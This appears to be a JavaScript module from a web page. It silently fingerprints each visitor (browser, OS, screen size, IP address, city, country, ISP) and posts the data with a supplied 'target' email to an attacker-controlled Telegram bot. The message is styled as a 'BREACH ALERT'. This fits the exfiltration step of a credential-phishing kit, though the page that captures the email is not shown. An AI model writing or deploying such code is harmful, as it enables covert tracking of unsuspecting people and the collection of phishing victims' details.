const TELEGRAM_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID;

export const gatherForensicData = async () => {
  try {
    const forensic = {};

    const userAgent = navigator.userAgent;
    let browserName = "Unknown";
    let osName = "Unknown";

    if (/Edg/.test(userAgent)) {
      browserName = "Edge";
    } else if (/Chrome/.test(userAgent)) {
      browserName = "Chrome";
    } else if (/Safari/.test(userAgent)) {
      browserName = "Safari";
    } else if (/Firefox/.test(userAgent)) {
      browserName = "Firefox";
    } else if (/Opera|OPR/.test(userAgent)) {
      browserName = "Opera";
    }

    if (/Windows/.test(userAgent)) {
      osName = "Windows";
    } else if (/Mac/.test(userAgent)) {
      osName = "macOS";
    } else if (/Linux/.test(userAgent)) {
      osName = "Linux";
    } else if (/Android/.test(userAgent)) {
      osName = "Android";
    } else if (/iPhone|iPad/.test(userAgent)) {
      osName = "iOS";
    }

    forensic.browser = browserName;
    forensic.os = osName;
    forensic.screenResolution = `${window.screen.width}x${window.screen.height}`;

    try {
      const ipRes = await fetch("https://api.ipify.org?format=json");
      const ipData = await ipRes.json();
      forensic.ip = ipData.ip || "Unknown";
    } catch {
      forensic.ip = "Unknown";
    }

    try {
      const geoRes = await fetch("https://ipapi.co/json/");
      const geoData = await geoRes.json();
      forensic.city = geoData.city || "Unknown";
      forensic.region = geoData.region || "Unknown";
      forensic.country = geoData.country_name || "Unknown";
      forensic.isp = geoData.org || "Unknown";
    } catch {
      forensic.city = "Unknown";
      forensic.region = "Unknown";
      forensic.country = "Unknown";
      forensic.isp = "Unknown";
    }

    forensic.timestamp = new Date().toLocaleString("en-US", {
      weekday: "short",
      year: "numeric",
      month: "short",
      day: "numeric",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
      timeZoneName: "short",
    });

    return forensic;
  } catch (error) {
    console.error("Forensic data gathering failed:", error);
    return {
      browser: "Unknown",
      os: "Unknown",
      screenResolution: "Unknown",
      ip: "Unknown",
      city: "Unknown",
      region: "Unknown",
      country: "Unknown",
      isp: "Unknown",
      timestamp: new Date().toLocaleString(),
    };
  }
};

export const sendTelegramAlert = async (message) => {
  try {
    if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
      console.warn("Telegram not configured");
      return;
    }
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML",
      }),
    });
  } catch (error) {
    console.error("Telegram Alert Failed:", error);
  }
};

export const sendForensicAlert = async (targetEmail, alertType = "BREACH") => {
  const forensic = await gatherForensicData();

  const message = `🚨 <b>INSTITUTIONAL ${alertType} ALERT</b>

👤 <b>TARGET IDENTITY</b>
Email: <code>${targetEmail}</code>

🌐 <b>NETWORK PROFILE</b>
IP: <code>${forensic.ip}</code>
ISP: <code>${forensic.isp}</code>

📍 <b>GEOGRAPHIC LOCATION</b>
Location: <code>${forensic.city}, ${forensic.region}, ${forensic.country}</code>

💻 <b>HARDWARE SIGNATURE</b>
Device: <code>${forensic.os}</code>
Browser: <code>${forensic.browser}</code>
Display: <code>${forensic.screenResolution}</code>

⏰ <b>TIMESTAMP</b>
<code>${forensic.timestamp}</code>`;

  sendTelegramAlert(message);
};
